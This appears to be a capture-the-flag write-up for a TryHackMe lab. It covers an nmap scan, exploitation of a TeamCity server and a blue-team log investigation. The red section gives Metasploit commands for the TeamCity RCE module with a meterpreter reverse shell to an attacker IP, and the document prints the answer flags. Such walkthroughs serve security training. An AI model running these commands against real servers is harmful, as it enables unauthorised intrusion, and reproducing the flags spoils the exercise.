# Brains

### Red: Exploit the Server!
- What is the content of flag.txt in the user's home folder?<br />
Initial nmap scan shows port 22,80 and 50000 open:

      # Nmap 7.94SVN scan initiated Thu Oct 24 13:25:08 2024 as: /usr/lib/nmap/nmap --privileged -p22,80,50000 -sV -sC -oN scan 10.10.255.64
      Nmap scan report for 10.10.255.64
      Host is up (0.049s latency).
      
      PORT      STATE SERVICE  VERSION
      22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   3072 27:e9:31:1b:37:ff:f4:a6:28:12:b2:42:38:04:d9:02 (RSA)
      |   256 c7:92:82:3a:64:b7:97:51:4b:55:f1:03:1e:bf:71:a4 (ECDSA)
      |_  256 15:01:a2:88:de:0d:81:c5:62:ea:d9:e2:89:e7:96:02 (ED25519)
      80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
      |_http-title: Maintenance
      |_http-server-header: Apache/2.4.41 (Ubuntu)
      50000/tcp open  ibm-db2?
      | fingerprint-strings: 
      |   GetRequest: 
      |     HTTP/1.1 503 
      |     TeamCity-Node-Id: MAIN_SERVER
      |     Pragma: no-cache
      |     Expires: Thu, 01 Jan 1970 00:00:00 GMT
      |     Cache-Control: no-cache
      |     Cache-Control: no-store
      |     Set-Cookie: TCSESSIONID=269C95301AE7386AEC7E1239DFF521E9; Path=/; HttpOnly
      |     Content-Type: text/html;charset=UTF-8
      |     Date: Thu, 24 Oct 2024 11:25:29 GMT
      |     Connection: close
      |     <!--
      |     Page: maintenance-welcome
      |     Stage: APPLICATION_STARTING
      |     State revision: 26
      |     Timestamp: Thu Oct 24 11:25:29 UTC 2024
      |     [Stage description: Initializing TeamCity server components]
      |     <!DOCTYPE html>
      |     <html>
      |     <head>
      |     <title>TeamCity Maintenance &mdash; TeamCity</title>
      |     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
      |     <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
      |     <meta name="application-name" content="TeamCity"/>
      |     <meta name="description" content="Powerful Continuous Integration and Build Server"/>
      |     <link href="
      |   ibm-db2, ibm-db2-das: 
      |     HTTP/1.1 400 
      |     Content-Type: text/html;charset=utf-8
      |     Content-Language: en
      |     Content-Length: 435
      |     Date: Thu, 24 Oct 2024 11:25:29 GMT
      |     Connection: close
      |     <!doctype html><html lang="en"><head><title>HTTP Status 400 
      |     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
      |_    Request</h1></body></html>
      1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
      SF-Port50000-TCP:V=7.94SVN%I=7%D=10/24%Time=671A2EA9%P=x86_64-pc-linux-gnu
      SF:%r(GetRequest,BFD,"HTTP/1\.1\x20503\x20\r\nTeamCity-Node-Id:\x20MAIN_SE
      SF:RVER\r\nPragma:\x20no-cache\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2
      SF:000:00:00\x20GMT\r\nCache-Control:\x20no-cache\r\nCache-Control:\x20no-
      SF:store\r\nSet-Cookie:\x20TCSESSIONID=269C95301AE7386AEC7E1239DFF521E9;\x
      SF:20Path=/;\x20HttpOnly\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDa
      SF:te:\x20Thu,\x2024\x20Oct\x202024\x2011:25:29\x20GMT\r\nConnection:\x20c
      SF:lose\r\n\r\n\n\n<!--\nPage:\x20maintenance-welcome\nStage:\x20APPLICATI
      SF:ON_STARTING\nState\x20revision:\x2026\nTimestamp:\x20Thu\x20Oct\x2024\x
      SF:2011:25:29\x20UTC\x202024\n\[Stage\x20description:\x20Initializing\x20T
      SF:eamCity\x20server\x20components\]\n-->\n\n\n\n\n\n<!DOCTYPE\x20html>\n<
      SF:html>\n\n<head>\n\n\x20\x20<title>TeamCity\x20Maintenance\x20&mdash;\x2
      SF:0TeamCity</title>\n\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20href=\"
      SF:/favicon\.ico\"\x20type=\"image/x-icon\"/>\n\x20\x20<meta\x20http-equiv
      SF:=\"content-type\"\x20content=\"text/html;\x20charset=UTF-8\"/>\n\x20\x2
      SF:0<meta\x20name=\"application-name\"\x20content=\"TeamCity\"/>\n\x20\x20
      SF:<meta\x20name=\"description\"\x20content=\"Powerful\x20Continuous\x20In
      SF:tegration\x20and\x20Build\x20Server\"/>\n\x20\x20<link\x20href=\"")%r(i
      SF:bm-db2-das,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;char
      SF:set=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:
      SF:\x20Thu,\x2024\x20Oct\x202024\x2011:25:29\x20GMT\r\nConnection:\x20clos
      SF:e\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20St
      SF:atus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"t
      SF:ext/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\
      SF:x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-s
      SF:ize:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x
      SF:20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;bac
      SF:kground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Sta
      SF:tus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%r(ibm
      SF:-db2,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=ut
      SF:f-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Th
      SF:u,\x2024\x20Oct\x202024\x2011:25:29\x20GMT\r\nConnection:\x20close\r\n\
      SF:r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x
      SF:20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/cs
      SF:s\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,
      SF:\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size:22
      SF:px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{fon
      SF:t-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgroun
      SF:d-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\x2
      SF:0400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>");
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Port 80 is under mantainance. Port 50000 shows a teamcity login page.<br />
![image](https://github.com/user-attachments/assets/08916bae-3ac0-4d0d-bf2b-c42b11b5f21b)<br />
Teamcity is a CI/CD (continuous integration/delivery) server that supports code creation, testing and realease. Searching online for this version, I found out that it is vulnerable to anauthenticated RCE and that there'a metasploit module available. Here's the msfconsole commands to use: 

    use multi/http/jetbrains_teamcity_rce_cve_2024_27198
    set target 3
    set payload cmd/linux/http/x64/meterpreter/reverse_tcp
    set rhosts 10.10.255.64
    set rport 50000
    set fetch_writable_dir /tmp
    set set lhost YOUR_IP
    run
![image](https://github.com/user-attachments/assets/5779c2bb-663c-4745-a848-fba55a520139)<br />
`THM{faa9bac345709b6620a6200b484c7594}`


### Blue: Let's Investigate
- What is the name of the backdoor user which was created on the server after exploitation?<br />
![image](https://github.com/user-attachments/assets/0409b302-854f-4c39-a119-098649d0a753)<br />
`eviluser`
- What is the name of the malicious-looking package installed on the server?<br />
![image](https://github.com/user-attachments/assets/90f94f9b-6d74-409a-873d-77ec69b9ded3)<br />
`datacollector`
- What is the name of the plugin installed on the server after successful exploitation?<br />
Search `index=weblogs`
![image](https://github.com/user-attachments/assets/fdbed84c-5da2-47df-99d0-2542edcb6263)<br />
`AyzzbuXY.zip`
